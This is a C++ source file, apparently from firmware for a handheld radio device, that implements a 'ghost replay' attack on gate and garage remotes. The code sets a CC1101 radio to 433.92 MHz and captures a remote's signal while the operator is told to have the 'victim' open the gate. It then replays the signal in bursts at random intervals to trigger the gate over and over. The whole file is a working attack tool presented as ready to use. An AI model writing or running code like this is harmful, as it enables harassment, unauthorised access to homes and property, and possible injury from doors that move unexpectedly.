#include "rf_ghost_replay.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include "core/display.h"
#include "core/mykeyboard.h"

// RF Ghost Replay Attack
// Captures gate/garage signals and replays them randomly to create "haunted" behavior

static uint8_t capturedCode[64]; // Buffer for captured signal
static int codeLength = 0;       // Actual captured code length

void rf_ghost_replay() {
    drawMainBorderWithTitle("Ghost Replay Attack");
    padprintln("");
    padprintln("Capturing gate signals...");
    padprintln("Have victim open/close gate");
    padprintln("");
    padprintln("Press Any key when captured");

    // Initialize CC1101 for capture
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setMHZ(433.92); // Adjust if different (433.32, etc.)
    ELECHOUSE_cc1101.setModulation(2); // GFSK common
    ELECHOUSE_cc1101.setDRate(4800); // Most gates use ~4.8kbaud
    ELECHOUSE_cc1101.setPktFormat(3); // Async serial mode (better for replay)
    ELECHOUSE_cc1101.setSyncMode(0); // No sync word

    bool captured = false;

    // PHASE 1: CAPTURE
    while (!captured && !check(AnyKeyPress)) {
        if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
            codeLength = ELECHOUSE_cc1101.ReceiveData(capturedCode);
            if (codeLength > 0) {
                captured = true;
                displaySuccess("Signal captured!", false);
                padprintln("Length: " + String(codeLength) + " bytes");
                padprintln("");
                padprintln("Starting ghost replay...");
                delay(2000);
            }
        }
        delay(100);
    }

    if (!captured) {
        displayInfo("No signal captured", true);
        return;
    }

    // PHASE 2: GHOST REPLAY
    while (!check(AnyKeyPress)) {
        // Repeat the code 3-12 times (to ensure gate catches it)
        int repeats = random(3, 13);
        for (int i = 0; i < repeats; i++) {
            ELECHOUSE_cc1101.SendData(capturedCode, codeLength);
            delay(10); // Small interval between repetitions
        }

        // Wait random time between 8-45 seconds before next attack
        int wait = random(8000, 45000);
        delay(wait);
    }

    displaySuccess("Ghost replay stopped", true);
}
